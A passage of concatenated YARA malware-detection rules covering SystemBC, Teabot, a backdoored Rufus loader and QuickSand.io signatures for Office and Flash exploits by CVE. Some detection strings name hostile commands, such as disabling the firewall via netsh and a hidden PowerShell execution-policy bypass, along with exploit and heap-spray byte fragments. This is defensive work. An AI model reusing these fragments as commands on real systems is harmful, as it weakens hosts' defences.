        malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.systembc"
        reference_1 = "https://twitter.com/Cryptolaemus1/status/1502069552246575105"
        reference_2 = "https://medium.com/walmartglobaltech/inside-the-systembc-malware-as-a-service-9aa03afd09c6"
        hash_1 = "c926338972be5bdfdd89574f3dc2fe4d4f70fd4e24c1c6ac5d2439c7fcc50db5"
        in_memory = "True"
    strings:
        $sx1 = "-WindowStyle Hidden -ep bypass -file" ascii
        $sx2 = "BEGINDATA" ascii
        $sx3 = "GET %s HTTP/1.0" ascii
        /*
        $s1 = "TOR:" ascii
        $s2 = "PORT1:" ascii
        $s3 = "HOST1:" ascii 
        */
        $s5 = "User-Agent:" ascii
        /* $s6 = "powershell" ascii */
        $s8 = "ALLUSERSPROFILE" ascii
    condition:
        ( uint16(0) == 0x5a4d and filesize < 30KB and 2 of ($sx*) ) or all of them
}
rule android_teabot {
    meta:
        author = "Thomas Barabosch, Telekom Security"
        version = "20210819"
        description = "matches on dumped, decrypted V/DEX files of Teabot"
        sample = "37be18494cd03ea70a1fdd6270cef6e3"

    strings:
        $dex = "dex"
        $vdex = "vdex"
        $s1 = "ERR 404: Unsupported device"
        $s2 = "Opening inject"
        $s3 = "Prevented samsung power off"
        $s4 = "com.huawei.appmarket"
        $s5 = "kill_bot"
        $s6 = "kloger:"
        $s7 = "logged_sms"
        $s8 = "xiaomi_autostart"

    condition:
        ($dex at 0 or $vdex at 0)
        and 6 of ($s*)
}
rule Vatet_Loader_Rufus_Backdoor : defray777
{
	meta:
        author = "Thomas Barabosch, Deutsche Telekom Security"
        twitter = "https://twitter.com/DTCERT"
		date = "2022-03-18"
        description = "Detects backdoored Rufus with Vatet Loader of Defray777"
        reference1 = "https://github.com/pbatard/rufus"
        reference2 = "https://unit42.paloaltonetworks.com/vatet-pyxie-defray777"
        sharing = "TLP:WHITE"
        hash_1 = "c9c1caae50459896a15dce30eaca91e49e875207054d98e32e16a3e203446569"
        hash_2 = "0cb8fc89541969304f3bf806e938452b36348bdd0280fc8f4e9221993e745334"
        in_memory = "False"
	strings:
        /*
            0x4d0714 660FF8C1                      psubb xmm0, xmm1
	        0x4d0718 660FEFC2                      pxor xmm0, xmm2
	        0x4d071c 660FF8C1                      psubb xmm0, xmm1
	    */
        $payload_decryption = { 66 0F F8 C1 66 0F EF C2 66 0F F8 C1 }
        $mz = "MZ" ascii
        $rufus = "https://rufus.ie/" ascii
	condition:
        $mz at 0
        and $payload_decryption
        and $rufus
}
/* Copyright (c) 2016 Tyler McLellan  TyLabs.com
 * QuickSand.io - Document malware forensics tool
 *
 * File quicksand_exe.yara   Dec 10 2016
 * Original source code available from https://github.com/tylabs/quicksand_lite
 * 
 * Decode and look in streams of Office Documents, RTF, MIME MSO.
 * XOR Database attack up to 256 byte keys to find embedded exe's.
 * Lite version - doesn't include cryptanalysis module and latest Office CVEs
 * Web version at http://quicksand.io/ has full features.
 *
 * Unless noted within the signature, signatures are subject to the terms
 * of the Mozilla Public License, v. 2.0. If a copy of the MPL was not
 * distributed with this file, You can obtain one at http://mozilla.org/MPL/2.0/. 
 *
 * Commercial licensing is available for the full version.
 */

rule executable_win_pe {
	meta:
		is_exe = true
		type = "win"
		revision = "100"
		rank = 10
		date = "Dec 27 2015"
		author = "@tylabs"
		copyright = "QuickSand.io 2015"
		tlp = "green"

	strings:
		$s1 = /MZ.{76}This program /
condition:
            1 of them
}

rule executable_win_pe_transposed {
	meta:
		is_exe = true
		type = "win"
		revision = "100"
		rank = 10
		date = "Dec 27 2015"
		author = "@tylabs"
		copyright = "QuickSand.io 2015"
		tlp = "green"

	strings:
		$s1 = /ZM.{76}hTsip orrgma/
condition:
            1 of them
}


rule executable_win_pe_transposed_offbyone {
	meta:
		is_exe = true
		type = "win"
		revision = "100"
		rank = 10
		date = "Dec 27 2015"
		author = "@tylabs"
		copyright = "QuickSand.io 2015"
		tlp = "green"

	strings:
		$s1 = /Z.{76}ih srpgoar macnntob  eur nniD SOm do/
condition:
            1 of them
}



rule executable_win {
	meta:
		is_exe = true
		type = "win"
		revision = "100"
		rank = 10
		date = "July 29 2015"
		author = "@tylabs"
		copyright = "QuickSand.io 2015"
		tlp = "green"

	strings:
		$s1 = "This program cannot be run in DOS mode"
		$s2 = "This program must be run under Win32"
		$s4 = "LoadLibraryA"
		$s5 = "GetModuleHandleA"
		$s6 = "GetCommandLineA"
		$s7 = "GetSystemMetrics" 
		$s8 = "GetProcAddress"
		$s9 = "CreateProcessA"
		$s10 = "URLDownloadToFileA"
		$s11 = "EnterCriticalSection"
		$s12 = "GetEnvironmentVariableA"
		$s13 = "CloseHandle"
		$s14 = "CreateFileA"
		$s15 = "URLDownloadToFileA"
		$s16 = "Advapi32.dll"
		$s17 = "RegOpenKeyExA"
		$s18 = "RegDeleteKeyA"
		$s19 = "user32.dll"
		$s20 = "shell32.dll"
		$s21 = "KERNEL32"
		$s22 = "ExitProcess"
		$s23 = "GetMessageA"
		$s24 = "CreateWindowExA"
		$s25 = {504500004C010100} // PE header
	condition:
            1 of them and not executable_win_pe
}




rule executable_win_transposed {
	meta:
		is_exe = true
		type = "win-tp"
		revision = "100"
		rank = 10
		date = "July 29 2015"
		desc = "Transposition cipher"
		author = "@tylabs"
		copyright = "QuickSand.io 2015"
		tlp = "green"

	strings:
		$s1 = "hTsip orrgmac naon tebr nui  nOD Somed" //string.transposition cipher of This program cannot be run in DOS mode
	condition:
            1 of them and not executable_win_pe_transposed
}

rule executable_win_rtl {
	meta:
		is_exe = true
		type = "win-rtl"
		rank = 10
		revision = "100"
		date = "July 29 2015"
		desc = "Right to Left compression LZNT1"
		author = "@tylabs"
		copyright = "QuickSand.io 2015"
		tlp = "green"
	strings:
		$s1 = {2070726F6772616D002063616E6E6F74200062652072756E2069006E20444F53206D6F} // string.RTL.This program cannot be run in DOS mode
	condition:
            1 of them
}

rule executable_win_reversed {
	meta:
		is_exe = true
		type = "win-reversed"
		rank = 10
		revision = "100"
		date = "July 29 2015"
		desc = "EXE is stored backwards"
		author = "@tylabs"
		copyright = "QuickSand.io 2015"
		tlp = "green"
	strings:
		$s1 = "edom SOD ni nur eb tonnac margorp sihT" // string.reverse This program cannot be run in DOS mode	condition:
	condition:
            1 of them
}



rule executable_vb {
	meta:
		is_exe = true
		revision = "100"
		rank = 10
		type = "vb"
		date = "July 29 2015"
		author = "@tylabs"
		copyright = "QuickSand.io 2015"
		tlp = "green"
	strings:
		$s1 = "impersonationLevel=impersonate"
		$s2 = "On Error Resume Next"
		$s3 = "WScript.CreateObject(\"WScript.Shell\")"
		$s4 = "CreateObject(\"Scripting.FileSystemObject\")"
	condition:
            1 of them
}


rule executable_macosx {
	meta:
		is_exe = true
		type = "macosx"
		revision = "100"
		rank = 10
		date = "July 29 2015"
		author = "@tylabs"
		copyright = "QuickSand.io 2015"
		tlp = "green"
	strings:
		$s1 = "<key>RunAtLoad</key>"
		$s2 = "__mh_execute_header"
		$s3 = "/Developer/SDKs/MacOSX10.5.sdk/usr/include/libkern/i386/_OSByteOrder.h"
		$s4 = "__gcc_except_tab__TEXT"
		$s5 = "/System/Library/Frameworks/CoreServices.framework/Versions/A/CoreServices"
		$s6 = "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation"
		$s7 = "@_getaddrinfo"
		$s8 = "@_pthread_create"
		$s9 = "StartupParameters.plist"
		$s10 = "dyld__mach_header"
		$s11 = "/usr/lib/libSystem"
		$s12 = "/usr/lib/dyld"
		$s13 = "__PAGEZERO"
		$s14 = "/usr/lib/libgcc_s"
	condition:
            1 of them
}


/* Copyright (c) 2016, 2017 Tyler McLellan  TyLabs.com
 * @tylabs
 * QuickSand.io - Document malware forensics tool
 *
 * File quicksand_exploits.yara   Nov 20 2017
 * Original source code available from https://github.com/tylabs/quicksand_lite
 * 
 * Decode and look in streams of Office Documents, RTF, MIME MSO.
 * XOR Database attack up to 256 byte keys to find embedded exe's.
 * Lite version - doesn't include cryptanalysis module and latest Office CVEs
 * Web version at http://quicksand.io/ has full features.
 *
 * Unless noted within the signature, signatures are subject to the terms
 * of the Mozilla Public License, v. 2.0. If a copy of the MPL was not
 * distributed with this file, You can obtain one at http://mozilla.org/MPL/2.0/. 
 *
 * Commercial licensing is available for the full version.
 */

rule warning_exec_ocx_object {
	meta:
		is_exploit = true
		is_warning = false
		is_feature = true
		rank = 5
		revision = "1"
		date = "July 29 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "OLE application command"
	strings:
		$s1 = "w:ocx w:data=\"DATA:application/x-oleobject"
	condition:
            1 of them
}




rule warning_scriptbridge {
	meta:
		is_exploit = false
		is_warning = true
		is_feature = true
		rank = 5
		revision = "1"
		date = "July 29 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "ScriptBridge may load remote exploit"
	strings:
		$s1 = "ScriptBridge.ScriptBridge.1"

	condition:
            1 of them
}



rule exploit_cve_2006_2492 {
	meta:
		is_exploit = true
		is_warning = false
		is_feature = false
		rank = 10
		revision = "1"
		date = "July 29 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "smarttag overflow CVE-2006-2492"
	strings:
		$s1 = {0600DDC6040011000100D65A12000000000001000000060000000300}
		$s2 = {0600C8BE1B0008000200685B1200}
	condition:
            1 of them
}

rule exploit_cve_2009_3129 {
	meta:
		is_exploit = true
		is_warning = false
		is_feature = false
		rank = 10
		revision = "1"
		date = "July 29 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "excel buffer overflow CVE-2009-3129"
	strings:
		$s1 = {4F7269656E746174696F6E??504F33}
	condition:
            1 of them
}


rule warning_embedded_flash {
	meta:
		is_exploit = false
		is_warning = true
		is_feature = true
		rank = 5
		revision = "1"
		date = "July 29 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Embedded Flash data"
	strings:
		$cws = {66556655??????00435753}
		$fws = {66556655??????00465753}
		$zws = {66556655??????005a5753}
		$control = "CONTROL ShockwaveFlash.ShockwaveFlash"
		$jit = {076A69745F656767}
		$generic = "ShockwaveFlash.ShockwaveFlash."
		$genericw = "ShockwaveFlash" wide
		$generich = "53686F636B77617665466C6173682E53686F636B77617665466C6173682E"

	condition:
            1 of them
}



rule exploit_cve_2011_0609 {
	meta:
		is_exploit = true
		is_warning = false
		is_feature = false
		rank = 10
		revision = "1"
		date = "July 29 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Flash exploit CVE-2011-0609"
	strings:
		$s1 = {4657530947CB0000480140005A0000190100441108000000BF141CCB0000000000000010002E00060080804094A8D0A001808004100002000000121212E24130F00931343134313431343134313431343134313431343134313431343134313431343134313431343134313431343134313431343134}
		$s2 = {34363537353330394541433730303030373830303036343030303030304338303030303032443031303034343131313830303030303034333032463446344634383630363036303230303031303030304646303931303030303030303033303030313030383630363036303130303032303030303430303030303030424631313235}
		$s3 = {3941303139413031394130313941303139064C6F61646572}

	condition:
            1 of them
}

rule exploit_cve_2011_0611 {
	meta:
		is_exploit = true
		is_warning = false
		is_feature = false
		rank = 10
		revision = "1"
		date = "July 29 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Flash exploit CVE-2011-061"
	strings:
		$s1 = {7772697465427974650541727261799817343635373533304143433035303030303738}
		$s2 = {5131645443737746414142346E453155625778545A52512B743733742B3362744B4E30596E617767552F414452654D5848334777597276757737597A643743674A734A6C76643174374E716D393959576D4B676B5A7674686C68446942556E344D694645453030514659306D456F664A2B4F45504D55594E6F69614C526D4E696A4D45494444665065652B3139663534652B35356E764F63383578376532766732514551504148514C6B45384248683175303937414B7741654943394F6A336579756277574E52793141564A475939326D4777444832794278794147636569424250524348}
		$s3 = {343635373533304143433035303030303738303030353546303030303046413030303030313830313030343431313030303030303030334630334137303530303030393630433030303530303037393543333743313330374642433337433133304531323944303230303443303439443032303031383030383831353030303930303431}
		$s4 = {3063306330633063306330633063306306537472696E6706}
		$s5 = {410042004300440045004600470048004900A18E110064656661756C74}
		$s6 = {00414243444500566B6475686752656D686677317375727772777C73680064656661756C740067657453697A650047647768317375727772777C73680077777273757277}
		$s7 = "AAB4AAVfAAAPoAAAGAEARBEAAAAAPwOnBQAAlgwABQAHlcN8Ewf7w3wTDhKdAgBMBJ0CABgAiBUACQBBAEIAQwBEAEUARgBHAEgASQChjhEAZGVmYXVsdAABAAQqAAIAmAGWCgAHWMBJSAenP7a3YJ0CAAAAmQIASQBAlgUABxZ0cAtMYp0CAAwAhwEAAxeHAQABlgoAB"
    

	condition:
            1 of them
}
    
    
    
rule exploit_cve_2012_0754 {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "Flash exploit malformed mp4 CVE-2012-0754"
    strings:
        $s1 = {537472696E6706586D6C537766094D6F766965436C6970076A69745F656767086368696C645265660D446973706C61794F626A656374074D79566964656F05566964656F044D794E430D4E6574436F6E6E656374696F6E}
    condition:
        1 of them
}


rule exploit_cve_2010_3333 {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "July 29 2015"
	release = "lite"
        author = "@tylabs"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "RTF stack overflow pFragments CVE-2010-3333"
    strings:
        $s1 = /sn .{1,300}?pFragments.{1,700}?sv .{1,200}?[a-zA-Z0-9\*\+]{50}?/
        $s2 = "\\sn\\*\\sn-pFragments"
        $s3 = /pFragments.{1,200}?\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x0D\x0A/
        $s4 = /sn pfragments.{1,30}?11111111/
        $s5 = /sn[\W]{1,20}?pFragments/
        $s6 = "\\sn9pFRagMEnTS"
        $s7 = {5C736E34096D656E7473}
    condition:
        1 of them
}
    
    


    
    
rule warning_rtf_embedded_file {
    meta:
        is_exploit = false
        is_warning = true
        is_feature = true
        rank = 2
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_warning"
        desc = "TF embedded file package"
    strings:
        $s1 = /objdata.{1,300}\w*5\w*0\w*6\w*1\w*6\w*3\w*6\w*b\w*6\w*1\w*6\w*7\w*6\w*5\w*0\w*0/
        $s2 = "\\objclass Word.Document"
    condition:
        1 of them
}

    
rule exploit_MS12_060_tomato_garden {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "Office exploit MSCOMCTL.OCX Toolbar MS12-060 Tomato Garden campaign"
    strings:
        $s1 = "CONTROL MSComctlLib.Toolbar.2"
        $s2 = "Toolbar1, 0, 0, MSComctlLib, Toolbar"
        $s3 = "MSComctlLib.Toolbar.2"
        $s4 = {4D53436F6D63746C4C69622E546F6F6C6261722E32}
    condition:
        1 of them
}

    

rule warning_office_encrypted_doc {
    meta:
        is_exploit = false
        is_warning = true
        is_feature = true
        rank = 1
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "office encrypted document"
    strings:
        $s1 = {4D006900630072006F0073006F0066007400200042006100730065002000430072007900700074006F0067007200610070006800690063002000500072006F0076006900640065007200200076}
        $s2 = {45006E006300720079007000740065006400530075006D006D006100720079}
    condition:
        1 of them
}

    
    
    
rule exploit_cve_2012_1535 {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "Flash exploit CVE-2012-1535"
    strings:
        $s1 = {4578616D706C650B6372656174654C696E65730968656170537072617908686578546F42696E076D782E636F72650A49466C6578417373657409466F6E7441737365740A666C6173682E74657874}
        $s2 = {454D4245444445445F4346460A666F6E744C6F6F6B75700D456C656D656E74466F726D617408666F6E7453697A650B54657874456C656D656E7407636F6E74656E740E637265617465546578744C696E6508546578744C696E650178017906686569676874086164644368696C6406456E6469616E0D4C4954544C455F454E4449414E06656E6469616E223063306330633063}
    condition:
        1 of them
}


    
    
rule exploit_cve_2013_0634 {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "Flash exploit CVE-2013-0634 memory corruption"
    strings:
        $s1 = {8A23ABA78A01908B23EED461D8872396A39A02F48523A1F94AB48323FBE0E303}
    condition:
        1 of them
}
   
rule exploit_cve_2012_5054 {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "Flash exploit CVE-2012-5054 Matrix3D"
    strings:
        $s1 = {7772697465446F75626C65084D61747269783344064F626A6563740B666C6173682E6D6564696105536F756E640C666C6173682E73797374656D0C4361706162696C69746965730776657273696F6E0B746F4C6F776572436173651077696E}
    condition:
        1 of them
}
    
    
    

    
    
rule exploit_cve_2012_1856 {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "Office exploit MSCOMCTL.OCX TabStrip CVE-2012-1856"
    strings:
        $s1 = "MSComctlLib.TabStrip"
        $s2 = "4d53436f6d63746c4c69622e546162537472697" nocase
        $s3 = "9665fb1e7c85d111b16a00c0f0283628" nocase
        $s4 = "1EFB6596-857C-11D1-B16A-00C0F0283628" nocase

    condition:
        1 of them
    }
    
    
rule warning_mime_mso_embedded_flash {
    meta:
        is_exploit = false
        is_warning = true
        is_feature = true
        rank = 1
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
	release = "lite"
        sigtype = "cryptam_exploit"
        desc = "office embedded Flash in MSO file"
    strings:
        $s1 = "D27CDB6E-AE6D-11CF-96B8-444553540000" nocase
    condition:
        1 of them
}


    
rule exploit_cve_2012_0158 {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "Office exploit MSCOMCTL.OCX RCE CVE-2012-0158"
    strings:
        $s1 = /objdata.{1,100}?53436F6D63746C4C69622E4C/
        $s2 = "ListView2, 1, 1, MSComctlLib, ListView"
        $s3 = "ListView1, 1, 0, MSComctlLib, ListView"
        $s4 = /0000000000000000000000000000000000000000000000.{1,300}?49746D736400000002000000010000000C000000436F626A/
        $s5 = /MSComctlLib.ListViewCtrl.{1,25}?objdata/
        $s6 = "MSComctlLib.ListViewCtrl.2"
        $s7 = {4C00690073007400560069006500770041}
        $s8 = {ECBD010005009017190000000800000049746D736400000002000000010000000C000000436F626A??0000008282000082820000000000000000000000000000????????90}
        //$s9 = {3131313131313131310D0D0D1320434F4E54524F4C204D53436F6D63746C4C69622E4C697374566965774374726C2E32}
        $s10 = "978C9E23-D4B0-11CE-BF2D-00AA003F40D0" nocase
        $s11 = "BDD1F04B-858B-11D1-B16A-00C0F0283628" nocase
        $s12 = "C74190B6-8589-11D1-B16A-00C0F0283628" nocase
        $s13 = "996BF5E0-8044-4650-ADEB-0B013914E99C" nocase
        $s14 = "9181DC5F-E07D-418A-ACA6-8EEA1ECB8E9E" nocase
        $s15 = "\\7300740056006\\"
        $s16 = "4C69{\\*}7374566"
        $s17 = "4C0069007300740056006900650077004" nocase
        $s18 = "4BF0D1BD8B85D111B16A00C0F0283628" nocase
        $s19 = {4BF0D1BD8B85D111B16A00C0F0283628}
        $s20 = "COMCTL.TreeCtrl.1"
        $s21 = {434F4D43544C2E547265654374726C2E31}
	$s22 = "4D53436F6D63746C4C69622E4C697374566965774374726C2E" nocase
	$s23 = "MSComctlLib.ListViewCtrl.0"
	$s24 = {4D 53 43 6F 6D 63 74 6C 4C 69 62 2E 4C 69 73 74 56 69 65 77 43 74 72 6C 2E 30}
	$s25 = "4D53436F6D63746C4C69622E4C697374566965774374726C2E30" nocase


condition:
        1 of them
}
    
    
    
rule warning_activex_exec {
    meta:
        is_exploit = false
        is_warning = true
        is_feature = true
        rank = 8
        revision = "3"
        date = "Oct 11 2017"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015, 2017. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "ActiveX content"
    strings:
        $s1 = "MSComctlLib.TreeCtrl.2"
        $s2 = "4D53436F6D63746C4C69622E547265654374726C2E32" nocase
        $s3 = "B69041C78985D111B16A00AA003F40D0" nocase
    $s4 = {B69041C78985D111B16A00AA003F40D0}
    $s5 = "C74190B6-8589-11D1-B16A-00AA003F40D0" nocase
    $s6 = "C74190B6-8589-11D1-B16A-00C0F0283628" nocase
    $s7 = {B69041C78985D111B16A00C0F0283628}
    $s8 = "B69041C78985D111B16A00C0F0283628" nocase
    $s9 = "objclass MSComctlLib.ImageComboCtl.2"
    $s10 = "MSComctlLib.ImageComboCtl.2"
    $s11 = {00 4D 53 43 6F 6D 63 74 6C 4C 69 62 2E 49 6D 61 67
        65 43 6F 6D 62 6F 43 74 6C}
    $s12 = {49006D0061006700650043006F006D0062006F00430074006C002000}
    $s13 = "TreeView1, 0, 0, MSComctlLib, TreeView"
    $s14 = "new ActiveXObject"
    $s15 = "<ax:ocx ax:classid=" ascii nocase

    
    condition:
        1 of them
    }



    rule warning_vb_potential_heapspray {
    meta:
        is_exploit = false
        is_warning = true
        is_feature = true
        rank = 2
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
	release = "lite"
        sigtype = "cryptam_exploit"
        desc = "office heap spray"
    strings:
        $s1 = "90909090EB7F414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412490909090"
    condition:
        1 of them
    }
    
    
    rule exploit_cve_2013_3906 {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "Office exploit TIFF CVE-2013-3906"
    strings:
        $s1 = {49492A00C8490000803FE0503824160D0784426150B864361D0F8844625138A4562D178C466351B8E4763D1F90486452392418012794496552B964B65D2F984C665339A4D66D379C4E6753B9E4F67D3FA05068543A25168D47A4526954BA65361D2894D3AA553AA556AD57AC566B55BAE576BD5FB0586C563B2596CD67B25424F68B65B6DD6FB85C6E573BA5D6ED77BC5E6F57BBE5F64751BF6070583C26170D87C4627158BC66371D8FA5DA80190CA6572D97CC667359BC5404803FE0503824160D0784426150B864361D0F88446251}
        $s2 = {49492a000800000002000e010200fc3a0000260000006987040001000000223b00007c5a00000a0a0a0a0a}
        $s3 = /jpegblip.{1,20}?49492a00cf660000ffff/
        
    condition:
        1 of them
}
    
    
    
    rule warning_package_manager_embedded {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 1
        revision = "2"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "Office package manager may load unsafe content such as shell scripts"
    strings:
        $s1 = "0003000C-0000-0000-c000-000000000046" nocase
        $s2 = "0c00030000000000c000000000000046"
        $s3 = {0c00030000000000c000000000000046}
	$s4 = "20a70df22fc0ce11927b0800095ae340" nocase
	$s5 = {20a70df22fc0ce11927b0800095ae340}
        $s7 = "Packager Shell Object" ascii wide
        
    condition:
        1 of them
    }
    

    rule exploit_eicar_test_file {
    meta:
        is_exploit = true
        is_warning = false
        is_feature = false
        rank = 10
        revision = "1"
        date = "July 29 2015"
        author = "@tylabs"
	release = "lite"
        copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
        tlp = "white"
        sigtype = "cryptam_exploit"
        desc = "eicar test signature"
    strings:
        $s1 = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
        
    condition:
        $s1
    }




rule warning_vb_macro {
	meta:
		is_exploit = false
		is_warning = true
		is_feature = true
		rank = 3
		revision = "2"
		date = "Oct 5 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Visual Basic macro"
	strings:
		$s1 = "Name=\"VBAProject\"" nocase
		$s2 = "OLE Automation" wide nocase
		$s3 = "Visual Basic For Applications" wide nocase
		$s5 = "VBA6\\VBE6.DLL" wide nocase
		$s6 = "000204EF-0000-0000-C000-000000000046" ascii wide
		$s7 = "00020430-0000-0000-C000-000000000046" ascii wide
		$s8 = {000204EF00000000C000000000000046}
		$s9 = {0002043000000000C000000000000046}
		$s10 = "000204EF00000000C000000000000046"
		$s11 = "0002043000000000C000000000000046"
		$s12 = "wne:vbaSuppData" nocase
		$s13 = "wne:macroName" nocase

	condition:
            1 of them
}

rule warning_js_embed {
	meta:
		is_exploit = false
		is_warning = true
		is_feature = true
		rank = 3
		revision = "1"
		date = "Apr 12 2017"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2017. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Embedded js"
	strings:
		$s1 = {6a 73 00}
		$s2 = "Package"
		$s3 = {2e 00 6a 00 73}
		$s4 = "Ole10Native" wide
	condition:
            3 of them
}


rule exploit_activex_execute_shell {
	meta:
		is_exploit = true
		is_warning = true
		is_feature = true
		rank = 3
		revision = "2"
		date = "July 29 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Visual Basic execute shell"
	strings:
		$s1 = "Wscript.Shell" nocase
		$s2 = "netsh firewall set opmode mode=disable" nocase
		$s3 = "Shell" nocase
		$s4 = "CreateObject" nocase
		$s5 = "GetObject" nocase
		$s6 = "SendKeys" nocase
		$s7 = "MacScript" nocase
		$s8 = "FollowHyperlink" nocase
		$s9 = "CreateThread" nocase
		$s10 = "ShellExecute" nocase
		$s11 = "shell.application" nocase
	condition:
            (warning_vb_macro or warning_js_embed) and 1 of them
}




rule warning_vb_autoopen {
	meta:
		is_exploit = false
		is_warning = true
		is_feature = true
		rank = 3
		revision = "1"
		date = "Oct 5 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Visual Basic macro"
	strings:
		$s1 = "Document_Open"
		$s2 = "AutoOpen"
		$s3 = "Document_Close"
		$s4 = "AutoExec"
		$s5 = "Auto_Open"
		$s6 = "AutoClose"
		$s7 = "Auto_Close"
		$s8 = "DocumentBeforeClose"
		$s9 = "DocumentChange"
		$s10 = "Document_New"
		$s11 = "NewDocument"
		$s12 = "Workbook_Open"
		$s13 = "Workbook_Close"

	condition:
            warning_vb_macro and 1 of them
}


rule warning_vb_fileio {
	meta:
		is_exploit = false
		is_warning = true
		is_feature = true
		rank = 4
		revision = "2"
		date = "July 29 2015"
		author = "@tylabs"
		release = "lite"
		copyright = "QuickSand.io (c) Copyright 2015. All rights reserved."
		tlp = "white"
		sigtype = "cryptam_exploit"
		desc = "Visual Basic file io"
	strings:
		$s1 = "Scripting.FileSystemObject" nocase
		$s2 = "OpenTextFile"
		$s3 = "FileCopy"
		$s4 = "CopyFile"
		$s5 = "Kill"
		$s6 = "CreateTextFile"
		$s7 = "VirtualAlloc"
		$s8 = "RtlMoveMemory"
		$s9 = "URLDownloadToFileA"
		$s10 = "AltStartupPath"
		$s11 = "URLDownloadToFileA"
		$s12 = "ADODB.Stream"
		$s13 = "WriteText"
